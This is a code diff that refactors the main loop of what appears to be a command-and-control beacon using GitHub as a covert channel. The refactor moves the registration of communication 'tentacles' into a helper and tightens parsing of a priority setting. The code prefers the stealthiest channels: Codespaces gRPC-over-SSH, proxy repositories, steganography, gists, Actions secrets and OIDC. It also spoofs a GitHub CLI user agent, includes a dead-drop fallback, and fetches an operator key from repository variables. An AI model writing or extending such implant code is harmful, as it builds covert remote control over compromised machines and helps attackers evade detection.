@@ -28,31 +28,15 @@ import { readdir, readFile } from "node:fs/promises";
 import { existsSync } from "node:fs";
 
 import { ConnectionFactory }  from "./factory/ConnectionFactory.ts";
-import { IssuesTentacle }     from "./tentacles/IssuesTentacle.ts";
-import { HttpTentacle }       from "./tentacles/HttpTentacle.ts";
-import { NotesTentacle }           from "./tentacles/NotesTentacle.ts";
-import { BranchTentacle }          from "./tentacles/BranchTentacle.ts";
-import { GistTentacle }            from "./tentacles/GistTentacle.ts";
-import { OidcTentacle }            from "./tentacles/OidcTentacle.ts";
-import { ActionsTentacle }         from "./tentacles/ActionsTentacle.ts";
-import { SecretsTentacle }         from "./tentacles/SecretsTentacle.ts";
-import { RelayConsortiumTentacle } from "./tentacles/RelayConsortiumTentacle.ts";
-import { OctoProxyTentacle }       from "./tentacles/OctoProxyTentacle.ts";
-import { SteganographyTentacle }   from "./tentacles/SteganographyTentacle.ts";
-import { DeadDropResolver }        from "./recovery/DeadDropResolver.ts";
-
-// GrpcSshTentacle is loaded dynamically to avoid bundling @grpc/grpc-js,
-// protobufjs, and ssh2 (~9.5 MB) into beacons that never use the codespaces
-// channel.  The import is deferred until the tentacle is actually needed.
-async function loadGrpcSshTentacle(): Promise<typeof import("./tentacles/GrpcSshTentacle.ts")> {
-  return await import("./tentacles/GrpcSshTentacle.ts");
-}
-import type { DeadDropPayload }    from "./recovery/DeadDropResolver.ts";
+import { registerTentacles }  from "./factory/registerTentacles.ts";
+import { DeadDropResolver }   from "./recovery/DeadDropResolver.ts";
 import { TaskExecutor }       from "./tasks/TaskExecutor.ts";
 import { loadState }         from "./state/BeaconState.ts";
 import { bytesToBase64, base64ToBytes, generateKeyPair } from "./crypto/sodium.ts";
+import { GH_UA }              from "./lib/constants.ts";
 import { createLogger }      from "./logger.ts";
 import type { BeaconConfig, CheckinPayload, RelayConfig, ProxyConfig } from "./types.ts";
+import type { DeadDropPayload } from "./recovery/DeadDropResolver.ts";
 
 const log = createLogger("svc");
 
@@ -67,7 +51,7 @@ async function resolveOperatorPublicKey(token: string, owner: string, repo: stri
   try {
     const resp = await fetch(
       `https://api.github.com/repos/${owner}/${repo}/actions/variables/MONITORING_PUBKEY`,
-      { headers: { Authorization: `Bearer ${token}`, "User-Agent": "GitHub CLI/gh/2.48.0" } },
+      { headers: { Authorization: `Bearer ${token}`, "User-Agent": GH_UA } },
     );
     if (resp.ok) {
       const data = await resp.json() as { value?: string };
@@ -145,10 +129,15 @@ function parseRelayConsortium(): RelayConfig[] {
   }
 }
 
+/** Valid tentacle kind strings for priority parsing. */
+const VALID_TENTACLE_KINDS = new Set<string>([
+  "issues", "codespaces", "branch", "actions", "secrets",
+  "notes", "gist", "oidc", "relay", "proxy", "stego", "http",
+]);
+
 /**
  * Parse SVC_TENTACLE_PRIORITY env var into a tentacle priority list.
  * Format: comma-separated kinds, e.g. "codespaces,proxy,issues"
- * Valid kinds: "issues" | "codespaces" | "notes" | "relay" | "proxy" | …
  *
  * When unset, auto-detects the stealthiest available order:
  *   1. "codespaces" — gRPC-over-SSH (if SVC_GRPC_DIRECT or Codespace SSH vars present)
@@ -156,12 +145,16 @@ function parseRelayConsortium(): RelayConfig[] {
  *   3. "proxy"      — OctoProxy relay (if SVC_PROXY_REPOS is non-empty)
  *   4. "issues"     — plain GitHub Issues (always last resort)
  */
-function parseTentaclePriority(): Array<"issues" | "codespaces" | "branch" | "actions" | "secrets" | "notes" | "gist" | "oidc" | "relay" | "proxy" | "stego" | "http"> {
-  type Kind = "issues" | "codespaces" | "branch" | "actions" | "secrets" | "notes" | "gist" | "oidc" | "relay" | "proxy" | "stego" | "http";
+export function parseTentaclePriority(): Array<
+  "issues" | "codespaces" | "branch" | "actions" | "secrets" |
+  "notes" | "gist" | "oidc" | "relay" | "proxy" | "stego" | "http"
+> {
+  type Kind = "issues" | "codespaces" | "branch" | "actions" | "secrets" |
+    "notes" | "gist" | "oidc" | "relay" | "proxy" | "stego" | "http";
+
   const raw = process.env.SVC_TENTACLE_PRIORITY?.trim();
   if (!raw) {
     // Auto-detect: prefer stealth channels when their prerequisites are present.
-    // Dot notation required for all baked vars: Bun --define only substitutes process.env.X, not process.env["X"].
     const hasGrpc = Boolean(
       process.env.SVC_GRPC_DIRECT ||
       (process.env.SVC_GRPC_CODESPACE_NAME && process.env.SVC_GITHUB_USER)
@@ -175,15 +168,30 @@ function parseTentaclePriority(): Array<"issues" | "codespaces" | "branch" | "ac
     })();
     const order: Kind[] = [];
     if (hasGrpc)  order.push("codespaces");
-    if (hasHttp)  order.push("http");      // WS/REST fallback when gRPC SSH fails
+    if (hasHttp)  order.push("http");
     if (hasProxy) order.push("proxy");
     order.push("issues"); // always the last-resort fallback
     return order;
   }
-  const VALID = new Set<string>(["issues", "codespaces", "branch", "actions", "secrets", "notes", "gist", "oidc", "relay", "proxy", "stego", "http"]);
-  const parts = raw.split(",").map(s => s.trim()).filter(s => VALID.has(s)) as Kind[];
-  if (parts.length === 0) return ["issues"];
-  return parts;
+
+  const parts = raw.split(",").map(s => s.trim());
+  const valid: Kind[] = [];
+  const invalid: string[] = [];
+
+  for (const part of parts) {
+    if (VALID_TENTACLE_KINDS.has(part)) {
+      valid.push(part as Kind);
+    } else {
+      invalid.push(part);
+    }
+  }
+
+  if (invalid.length > 0) {
+    log.warn(`Invalid tentacle priority entries ignored: ${invalid.join(", ")}`);
+  }
+
+  if (valid.length === 0) return ["issues"];
+  return valid;
 }
 
 export function parseCleanupDays(): number | undefined {
@@ -216,7 +224,6 @@ export function parseProxyRepos(): ProxyConfig[] {
 
 async function loadConfig(beaconId: string): Promise<BeaconConfig> {
   // Support both OCTOC2_GITHUB_TOKEN (canonical) and SVC_TOKEN (legacy).
-  // Dot notation required: Bun --define only substitutes process.env.X, not process.env["X"].
   const token = (process.env.OCTOC2_GITHUB_TOKEN ?? process.env.SVC_TOKEN ?? "").trim();
   const owner = (process.env.OCTOC2_REPO_OWNER ?? "").trim();
   const repo  = (process.env.OCTOC2_REPO_NAME  ?? "").trim();
@@ -346,44 +353,7 @@ async function rebuildFactory(
   config: BeaconConfig
 ): Promise<void> {
   await factory.teardown();
-  for (const kind of config.tentaclePriority) {
-    if (kind === "issues") factory.register(new IssuesTentacle(config));
-    if (kind === "codespaces") {
-      // Dot notation required: Bun --define only substitutes process.env.X, not process.env["X"].
-      const hasGrpcDirect = Boolean(process.env.SVC_GRPC_DIRECT);
-      const hasCodespace  = Boolean(
-        process.env.SVC_GRPC_CODESPACE_NAME && process.env.SVC_GITHUB_USER
-      );
-      if (hasGrpcDirect || hasCodespace) {
-        const { GrpcSshTentacle } = await loadGrpcSshTentacle();
-        factory.register(new GrpcSshTentacle(config));
-      }
-    }
-    if (kind === "branch") factory.register(new BranchTentacle(config));
-    if (kind === "stego") factory.register(new SteganographyTentacle(config));
-    if (kind === "notes") factory.register(new NotesTentacle(config));
-    if (kind === "gist")  factory.register(new GistTentacle(config));
-    if (kind === "secrets") factory.register(new SecretsTentacle(config));
-    if (kind === "actions" && ActionsTentacle.isActionsAvailable()) {
-      factory.register(new ActionsTentacle(config));
-    }
-    if (kind === "oidc" && OidcTentacle.isOidcAvailable()) {
-      factory.register(new OidcTentacle(config));
-    }
-    if (kind === "relay" && (config.relayConsortium?.length ?? 0) > 0) {
-      factory.register(new RelayConsortiumTentacle(config));
-    }
-    if (kind === "proxy") {
-      const proxyRepos = config.proxyRepos ?? [];
-      factory.setProxyTentacles(
-        proxyRepos.map((proxyConfig) => new OctoProxyTentacle(config, proxyConfig))
-      );
-    }
-    if (kind === "http") {
-      const hasHttpUrl = Boolean(process.env.SVC_HTTP_URL);
-      if (hasHttpUrl) factory.register(new HttpTentacle(config));
-    }
-  }
+  await registerTentacles(factory, config, { silent: true });
 }
 
 // ── Main beacon loop ──────────────────────────────────────────────────────────
@@ -402,91 +372,8 @@ async function main(): Promise<void> {
   const consortium = parseRelayConsortium();
   config.relayConsortium = consortium;
 
-  // Register tentacles in priority order — stealth channels first.
-  // IssuesTentacle is registered at its position in the list (last resort by default).
-  for (const kind of config.tentaclePriority) {
-    switch (kind) {
-      case "issues":
-        factory.register(new IssuesTentacle(config));
-        break;
-      case "codespaces": {
-        // Register GrpcSshTentacle when SVC_GRPC_DIRECT or Codespace SSH is configured.
-        // SVC_GRPC_DIRECT skips SSH tunnel — used for E2E tests and direct gRPC deploys.
-        // Dot notation required: Bun --define only substitutes process.env.X, not process.env["X"].
-        const hasGrpcDirect = Boolean(process.env.SVC_GRPC_DIRECT);
-        const hasCodespace  = Boolean(
-          process.env.SVC_GRPC_CODESPACE_NAME && process.env.SVC_GITHUB_USER
-        );
-        if (hasGrpcDirect || hasCodespace) {
-          const { GrpcSshTentacle } = await loadGrpcSshTentacle();
-          factory.register(new GrpcSshTentacle(config));
-          log.info(`GrpcSshTentacle registered (${hasGrpcDirect ? "direct" : "SSH tunnel"} mode)`);
-        }
-        break;
-      }
-      case "branch":
-        factory.register(new BranchTentacle(config));
-        break;
-      case "stego":
-        factory.register(new SteganographyTentacle(config));
-        break;
-      case "notes":
-        factory.register(new NotesTentacle(config));
-        break;
-      case "gist":
-        factory.register(new GistTentacle(config));
-        break;
-      case "secrets":
-        factory.register(new SecretsTentacle(config));
-        break;
-      case "actions":
-        // ActionsTentacle is only viable inside a GitHub Actions job where
-        // the GITHUB_TOKEN env var is present.  Gate on its availability so
-        // a non-Actions beacon never attempts to register this channel.
-        if (ActionsTentacle.isActionsAvailable()) {
-          factory.register(new ActionsTentacle(config));
-          log.info("ActionsTentacle registered (GITHUB_TOKEN available)");
-        }
-        break;
-      case "oidc":
-        // OidcTentacle is only viable inside a GitHub Actions job that has
-        // `permissions.id-token: write`.  Gate on env var presence so a
-        // non-Actions beacon never attempts to register this channel.
-        if (OidcTentacle.isOidcAvailable()) {
-          factory.register(new OidcTentacle(config));
-          log.info("OidcTentacle registered (Actions id-token available)");
-        }
-        break;
-      case "relay":
-        // RelayConsortiumTentacle registered below after consortium is fully set
-        break;
-      case "proxy":
-        // Proxy tentacles registered below via setProxyTentacles()
-        break;
-      case "http": {
-        // Dot notation required: Bun --define only substitutes process.env.X, not process.env["X"].
-        const hasHttpUrl = Boolean(process.env.SVC_HTTP_URL);
-        if (hasHttpUrl) {
-          factory.register(new HttpTentacle(config));
-          log.info("HttpTentacle registered (SVC_HTTP_URL configured)");
-        }
-        break;
-      }
-    }
-  }
-
-  // Register RelayConsortiumTentacle if consortium is configured
-  if (consortium.length > 0) {
-    config.tentaclePriority = [...config.tentaclePriority, "relay"];
-    factory.register(new RelayConsortiumTentacle(config));
-  }
-
-  // Register proxy tentacles if configured
-  if (config.tentaclePriority.includes("proxy") && (config.proxyRepos?.length ?? 0) > 0) {
-    factory.setProxyTentacles(
-      config.proxyRepos!.map((proxyConfig) => new OctoProxyTentacle(config, proxyConfig))
-    );
-  }
+  // Single source of truth for tentacle registration
+  await registerTentacles(factory, config);
 
   // Dead-drop resolver (last resort — only used when all tentacles exhausted)
   const deadDropResolver = new DeadDropResolver(
